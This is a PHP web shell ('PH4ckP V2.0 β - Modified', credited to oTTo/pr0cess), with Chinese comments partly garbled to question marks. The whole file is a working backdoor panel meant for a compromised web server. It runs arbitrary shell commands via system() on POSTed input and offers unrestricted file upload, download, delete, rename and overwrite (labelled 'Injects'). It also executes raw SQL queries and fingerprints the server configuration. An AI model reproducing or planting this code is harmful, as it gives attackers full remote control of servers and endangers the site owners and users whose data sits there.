<?php
/*--------------------------------------------
Codz By oTTo
version: V1
Last Modified :2013/11/2
----------------------------------------------
*/
//?下面$downfile,$delfile,$refilname,$editfile 4??量是触?下面三??件?句的?量，值得?取是通?Url取得的。
$downfile=$_POST["downfile"];
$delfile = $_POST["delfile"];
$refilename = $_POST["refilename"];
$editfile = $_POST["editfile"];

//文件下?
if (isset($downfile)) 
        {
        #@set_time_limit(600);  #Limits the maximum execution time
        $filename = basename($downfile); #basename,filesize.readfile文件函?，用??文件?行操作的函?
        header("Content-Type: application/force-download; name=".$filename); #构造一?下?http?部信息。
        header("Content-Transfer-Encoding: binary");
        header("Content-Disposition: attachment; filename=".$filename);
        header("Expires: 0");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
      }
//?除文件
if(isset($delfile)&& $delfile!=""){    
        if(is_file($delfile)){     #if_file,unlink文件函?，用??文件?行操作的函?
            $message = (@unlink($delfile))
              ? "<font color=blue>The deletion document succeeds!`$delfile` Already deleted!</font>"
              : "<font color=blue>The deletion document is defeated！`$delfile` The document exists!</font>" ;
        }else{
            $message = "<font color=blue>File `$delfile` does not exist！</font>";
        }
        echo $message;
      }

//重命名文件
if (isset($refilename)){
  echo '<table>';
  echo '<form action="" method="post">';
  echo '<br>';
  echo '<tr>';
  echo '<td align="left">';
  echo '<font size="2">';
  echo 'Enter the newname to here：';
  echo '<input type="text" name="newname"/>';
  echo '<input type="submit" value="Rename"/>';
  echo '</tr>';echo '</td>';echo '</table>';
  $oldname=basename($refilename);               #rename文件函?，用??文件?行操作的函?
  if (@rename($oldname,$_POST['newname'])){
       echo '<script>alert(\'文件改名成功!\')</script>';}
  else
    { if (!empty($_POST['newname']))
        echo '<script>alert(\'文件改名失?!\')</script>';}
}
//??文件
if (isset($editfile)) {
  $content=basename($editfile);
  if(empty($_POST['newcontent'])){
    echo '<table><tr>';
    echo '<form action="" method="post">';
    echo '<input type="submit" value="Edition document"/>';
    echo '</tr>';    
    $fp=@fopen("$content","r");#fopen,fread,filesize,fclos,fwrite文件系?函?，用??文件?行操作的函?
    $data=@fread($fp,filesize($content));
    echo '<tr>';
    echo '<textarea name="newcontent" cols="80" rows="20" >';
    echo $data;
    @fclose($fp);
    echo '</textarea></tr></form></table>';
  }
   if (!empty($_POST['newcontent']))
    {
       $fp=@fopen("$content","w+");
       echo ($result=@fwrite($fp,$_POST['newcontent']))?"<font color=red>The injection document succeeds！Good Luck!</font>":"<font color=blue>The injection document is defeated！</font>"; 
       @fclose($fp);
    }
}

?>
<html>
<title>PH4ckP V2.0 β By pr0cess - Modified</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312";>
<STYLE type="text/css">
body {font-family: "sans-serif", "serif"; font-size: 12px;}
BODY { background-color:#A2B5CD }
a:link {color: #BFEFFF; text-decoration: none}
a:visited {color: #080808; text-decoration: none}
a:hover {color: #FFFFFF; text-decoration: underline}
input {font-family: "sans-serif", "serif";font-size: 12px;}
td {font-family: "sans-serif", "Verdana"; font-size: 12px;}
.title {font-family: "Verdana", "Tahoma";font-size: 20px;font-weight: bold; color=black}
</STYLE>
</head>
<body>
<table width="100%"  cellspacing="1" cellpadding="3">
  <tr>
    <td class="title" align="center">PH4ckP V2.0 β - Modified</td>
  </tr>
</table>
<hr>
<table width="100%"  cellspacing="1" cellpadding="3">
  <tr>
  <td>
  Operating system:
  <?php //php服?器?量 
  echo PHP_OS;?></td><td>Server name:<?echo $_SERVER['SERVER_NAME'];?><td>Server IP:<?echo gethostbyname($_SERVER['SERVER_NAME']);?></tr><tr></td><td>Server time:<?echo date("Y年m月d日 h:i:s",time());?></td><td>Server port :<?echo $_SERVER['SERVER_PORT'];
  ?>
  </td></tr>
</table>
<hr>
<table><tr><td><a href="?shell=env">『PHP探?模?』</a></td><td><a href="?shell=checkdir">『目???模?[快速]』</a></td><td> <a href="?shell=command">『命令?行模?』</a></td><td><a href="?shell=sql">『?据?操作模?』</a></td><td><a href="?shell=change">『字符??模?』</a></td></tr></table>
<hr>
<table><tr><td>Home dir:<a href="?dir=<?php echo $_SERVER['DOCUMENT_ROOT'];?>"><?php echo $_SERVER['DOCUMENT_ROOT'];?></a></td></tr><tr><td>Current dir of contents：<?php

//打印目?文件
$dir=$_GET['dir'];
if (!isset($dir) or empty($dir)) {
  $dir=str_replace('\\','/',dirname(__FILE__));
  echo "<font color=\"#00688B\">".$dir."</font>";
} else {
  
  echo "<font color=\"#00688B\">".$dir."</font>";
}
?></td>
  </tr>
<tr><td>
<form enctype="multipart/form-data" action="" method="post">
UploadFile：
<input name="upload_file" type="file" style="font-family:Verdana,Arial; font-size: 9pt;">
<input type="submit" value="Upload~" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD">
</form>
<?php

//文件上?
$upload_file=$_FILES['upload_file']['tmp_name'];
$upload_file_name=$_FILES['upload_file']['name'];
$upload_file_size=$_FILES['upload_file']['size'];

if($upload_file){
     $file_size_max = 1000*1000;
     $store_dir = dirname(__FILE__);
     $accept_overwrite = 1;  #?定是否覆?的??
     if ($upload_file_size > $file_size_max) {
           echo "兄弟！??小?滴！！<br>";
           exit;
          }

      if (file_exists($store_dir ."\\". $upload_file_name) && !$accept_overwrite) {
           Echo "文件已存在！";
           exit;
          }
      if (!move_uploaded_file($upload_file,$store_dir."\\".$upload_file_name)) {
           echo "上?文件失?！";
           exit;
       }



Echo "<p>Uploaded file:";
echo "<font color=blue>".$_FILES['upload_file']['name']."</font>";
echo "\t";

Echo "Uploadfilesiza:";
echo "<font color=blue>".$_FILES['upload_file']['size']." Bytes</font>";
echo "\t";

Echo "Sucessful..."; 

}
echo '</td></tr>';

echo '</tr>';

echo '</table>';
?>
<?php
echo '<table width="100%" border="0" cellspacing="1" cellpadding="3">';
echo '<form action="" method="get">';
  echo '<tr>';
    echo '<td>';
echo "The dir of contents glances over：";
echo '<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;">';
      echo '<input type="submit" value="GoTo" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD ">';
  echo '</td>';
  echo '</tr>';
echo '</form>';
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1">';
  echo '<tr>';
  echo '<td><b>';echo "Sub-Dir of contents";echo '</b></td>';
          echo '</tr>';
#打印上?目?
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
  $b="$dir/$file";
  $a=@is_dir($b);
  if($a=="1"){
    if($file!=".."&&$file!=".")  {
         echo "<tr>\n";
         echo "  <td><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">$file</a></td>\n";
         echo "</tr>\n";
    } else {
         if($file=="..")
         echo "<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">Back higher authority dir of contents</a>";
        }
    }
}
@closedir($dirs);
?>
</table>
<hr>
<table width="100%" border="0" cellpadding="3" cellspacing="1">
          <tr>
            <td><b>Filename</b></td>
            <td><b>Filedate</b></td>
            <td><b>Filesize</b></td>
            <td><b>Fileoperates</b></td>
          </tr>

<?php
//打印文件
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
  $b="$dir/$file";
  $a=@is_dir($b);
  if($a=="0"){
  $size=@filesize("$dir/$file")/1024; 
  $lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
    echo "<tr>\n";
    echo "<td>$file</td>\n";
  echo "  <td>$lastsave</td>\n";
    echo "  <td>$size KB</td>\n";
  echo "  <td><a href=\"?downfile=".urlencode($dir)."/".urlencode($file)."\">〔Down〕 </a><a href=\"?delfile=".urlencode($dir)."/".urlencode ($file)."\">〔Delete〕</a></a><a href=\"?refilename=".urlencode($dir)."/".urlencode($file)."\"> 〔Rename〕</a><a href=\"?editfile=".urlencode($dir)."/".urlencode($file)."\">〔Injects〕 </a></td>\n";
  echo "</tr>\n";
  }
}
@closedir($dirs);
?></table>
<hr>
#打印?境
<?php
if ($_GET['shell']=="env"){
     function dir_wriable($dir){
          $xY7_test=tempnam("$dir","test_file"); #???
          if ($fp=@fopen($xY7_test,"w")){
               @fclose($fp);
               @unlink($xY7_test);
               $wriable="ture";
           }
           else {
                $wriable=false or die ("Cannot open $xY7_test!");
            }
           return $wriable;
      }
     if (dir_wriable(str_replace('//','/',dirname(__FILE__)))){
             $dir_wriable='目?可?';
             echo "<b>?前目?可?!^ _ ^</b>";
      }
      else{
             $dir_wriable='目?不可?';
              echo "<b>?前目?不可?！</b>";
       }

       function getinfo($xy7)
       {
              if($xy7==1)
                 {
                    $s='<font color=blue>YES<b>√</b></font>';
                  }
                 else
                   {
                     $s='<font color=red>NO<b>×</b></font>';
                    }
                 return $s;
                 } 
         echo '<br><br>';
         echo "服?器系?：" ;
         echo PHP_OS;
         echo '<br>'   ;
         echo "服?器域名:";
         echo $_SERVER['SERVER_NAME'];
         echo '<br>';
         echo "WEB服?器端口：";
         echo $_SERVER['SERVER_PORT'];
         echo '<br>';
         echo "服?器??:";
         echo date("Y年m月d日 h:i:s",time());
         echo '<br>';
         echo "服?器IP地址:";
         echo gethostbyname($_SERVER['SERVER_NAME']);
         echo '<br>';
         echo "服?器操作系?文字??:";
         echo $_SERVER['HTTP_ACCEPT_LANGUAGE'];
         echo '<br>';
         echo "服?器解?引擎:";
         echo $_SERVER['SERVER_SOFTWARE'];
         echo '<br>';
         echo "PHP?行方式:";
         echo strtoupper(php_sapi_name());
         echo '<br>';
         echo "PHP版本:";
         echo PHP_VERSION;
         echo '<br>';
         echo "ZEND版本:";
         echo zend_version();
         echo '<br>';
         echo "本文件??路?:";
         echo __FILE__;
         echo '<br>';
         echo "服?器剩余空?:";
         echo intval(diskfreespace(".") / (1024 * 1024)).'MB';
         echo '<br>';
         echo "?本?行可占最大?存:";
         echo get_cfg_var("memory_limit");
         echo '<br>';
         echo "?本上?文件大小限制:";
         echo get_cfg_var("upload_max_filesize");
         echo '<br>';
         echo "被屏蔽函?:";
         echo get_cfg_var("disable_functions");
         echo '<br>';
         echo "POST方法提交限制:";
         echo get_cfg_var("post_max_size");
         echo '<br>';
         echo "?本超???:";
         echo get_cfg_var("max_execution_time")."秒";
         echo '<br>';
         echo "???接?:";
         echo getinfo(get_cfg_var("enable_dl"));
         echo '<br>';
         echo "自定?全局?量:";
         echo getinfo(get_cfg_var("register_globals"));
         echo '<br>';
         echo "?示??信息:";
         echo getinfo(get_cfg_var("display_errors"));
         echo '<br>';
         echo "PHP安全模式:";
         echo getinfo(get_cfg_var("safe_mode"));
         echo '<br>';
         echo "FTP文件??:";
         echo getinfo(get_magic_quotes_gpc("FTP support"));
         echo '<br>';
         echo"允?使用URL打?文件:";
         echo getinfo(get_cfg_var("allow_url_fopen"));
         echo '<br>';
         echo "SESSION支持:";
         echo getinfo(function_exists("session_start"));
         echo '<br>';
         echo "Socket支持:";
         echo getinfo(function_exists("fsockopen"));
         echo '<br>';
         echo "MYSQL?据?:";
         echo getinfo(function_exists("mysql_close"));
         echo '<br>';
         echo "SQL SERVER?据?:";
         echo getinfo(function_exists("mssql_close"));
         echo '<br>';
         echo "ODBC?据?:";
         echo getinfo(function_exists("odbc_close"));
         echo '<br>';
         echo "Oracle?据?:";
         echo getinfo(function_exists("ora_close"));
         echo '<br>';
         echo "SNMP??:";
         echo getinfo(function_exists("snmpget"));
         echo '<br>';
         echo '<br>';
}
elseif ($_GET['shell']=="checkdir"){
  global $PHP_SELF;
  echo '<form action="" method="post">';
  echo "快速目???:";
  echo '<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
  echo '<input type="submit" value="GoTo" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
  echo '<br>';
  echo '<textarea name="textarea" cols="70" rows="15">';
  if (empty($_POST['dir']))
       $newdir="./";
  else
       $newdir=$_POST['dir'];
       $handle=@opendir($newdir);
  while ($file=@readdir($handle))
    {
     echo ("$file \n");}
     echo '</textarea></form>';
}
elseif ($_GET['shell']=="command"){
echo '<table>';
echo '<form action="" method="post">';
echo '<br>';
echo '<tr>';
echo '<td align="left">';
echo 'Enter your command：';
echo '<input type="text" name="cmd" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
echo '<input type="submit" value="Run" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD"/>';
echo '</tr>';echo '</td>';
echo '<tr>';
echo '<td>';
echo '<textarea name="textarea" cols="70" rows="15" readonly>';
  @system($_POST['cmd']);
  echo '</textarea></form>';
}

elseif ($_GET['shell']=="change"){
echo '<form action="" method="post">';
echo '<br>';
echo "Enter binary character:";
echo '<input type="text" name="char" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
echo '<input type="submit" value="Transforms to Hexadecimal" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
echo '</form>';
echo '<textarea name="textarea" cols="40" rows="1" readonly>';
$result=bin2hex($_POST['char']);
  echo "0x".$result;
  echo '</textarea>';
}

//mysql操作
elseif ($_GET['shell']=="sql"){
  echo '<table align="center" cellSpacing=8 cellPadding=4>';
  echo '<tr><td>';
  echo '<form action="" method="post">';
  echo "Host:";
  echo '<input name="servername" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td><td>';
  echo "Username:";
  echo '<input name="username" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td></tr>';
  echo '<tr><td>';
  echo "Password:";
  echo '<input name="password" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td><td>';
  echo "DBname:";
  echo '<input name="dbname" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td></tr>';
  $servername = $_POST['servername'];
  $username = $_POST['username'];
  $password = $_POST['password'];
  $dbname = $_POST['dbname'];

  if ($link=@mysql_connect($servername,$username,$password) and @mysql_select_db($dbname)) {
      echo "<font color=blue>The database connects successfully!</font>";
      echo "<br>";
      //mysql_close();
  } else {
      echo "<font color=red>".mysql_error()."</font>";
      echo "<br>";
  }
  $dbresult = $_POST['query'];
  if (!empty($dbresult)){
      $dbresult = @mysql_query($dbresult);
      echo ($dbresult) ? "<font color=blue>Execution successfully!</font>" : "<font color=blue>The request makes a mistake:</font> "."<font color=red>".mysql_error()."</font>";
      mysql_close();}
      echo '<tr><td>';
      echo '<textarea name="query" cols="60" rows="10">';
      echo '</textarea>';
      echo '</td></tr>';
      echo '<tr><td align="center">';
      echo '<input type="submit" value="Execution SQL_query" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
      echo '</td></tr>';
      echo '</table>';

}
?>
<table align="center"><tr><td>
<h6>Copyright (C) 2006 All Rights Reserved
</td></tr></table>